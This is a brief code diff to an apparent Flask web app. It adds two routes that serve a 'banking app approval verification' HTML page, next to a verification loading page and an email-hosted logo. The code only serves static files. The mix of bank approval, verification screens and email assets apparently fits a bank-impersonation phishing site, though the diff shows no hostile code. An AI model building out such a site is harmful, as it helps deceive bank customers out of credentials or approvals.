@@ -305,6 +305,14 @@ def loading_page():
     """Serve the loading page shown during verification processing"""
     return send_from_directory('public', 'loading.html')  # Send loading HTML file from public directory
 
+# Route to serve the app approval page
+@app.route('/app-approval')
+@app.route('/app-verification')
+def app_approval():
+    """Serve the banking app approval verification page"""
+    return send_from_directory('public', 'app-approval.html')  # Send app approval HTML file from public directory
+
+
 # Route to serve the logo for email hosting
 @app.route('/logo-email.png')
 def logo_email():
